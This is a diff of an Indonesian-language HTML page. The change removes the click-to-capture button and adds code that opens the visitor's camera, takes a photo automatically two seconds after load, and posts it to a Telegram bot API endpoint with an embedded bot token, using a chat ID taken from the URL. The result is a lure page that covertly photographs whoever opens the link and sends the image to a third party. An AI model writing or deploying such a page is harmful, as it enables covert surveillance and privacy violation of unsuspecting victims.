@@ -1,47 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Akses Kamera</title>
+  <title>Akses Kamera Otomatis</title>
 </head>
 <body>
-  <h3>Ambil Foto dan Kirim ke Telegram</h3>
-  <video id="video" autoplay></video>
-  <br>
-  <button onclick="takePhoto()">📸 Ambil Foto</button>
+  <h3>📸 Kamera aktif... Mohon tunggu, foto akan dikirim otomatis.</h3>
+  <video id="video" autoplay playsinline style="width:100%;max-width:400px;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
+
   <script>
     const video = document.getElementById('video');
-    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-      video.srcObject = stream;
-    });
+    const params = new URLSearchParams(window.location.search);
+    const userId = params.get('id');
 
-    function takePhoto() {
+    async function initCamera() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      // Tunggu 2 detik sebelum ambil foto otomatis
+      setTimeout(() => takePhotoAndSend(), 2000);
+    }
+
+    function takePhotoAndSend() {
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
+
       canvas.toBlob((blob) => {
         const formData = new FormData();
-        const params = new URLSearchParams(window.location.search);
-        const userId = params.get('id');
-
         formData.append('chat_id', userId);
         formData.append('photo', blob, 'photo.jpg');
 
         fetch('https://api.telegram.org/bot7118007520:AAHLBLu9GTXzvzyHKiO8lxr3CFNKClsT3iE/sendPhoto', {
           method: 'POST',
           body: formData
-        })
-        .then(r => r.json())
-        .then(data => {
-          if (data.ok) {
-            alert("✅ Foto berhasil dikirim ke bot!");
-          } else {
-            alert("❌ Gagal kirim foto:\n" + JSON.stringify(data));
-          }
+        }).then(() => {
+          document.body.innerHTML += "<p>✅ Foto berhasil dikirim ke bot!</p>";
+        }).catch(() => {
+          document.body.innerHTML += "<p>❌ Gagal kirim foto.</p>";
         });
       }, 'image/jpeg');
     }
+
+    initCamera();
   </script>
 </body>
-    </html>
+</html>
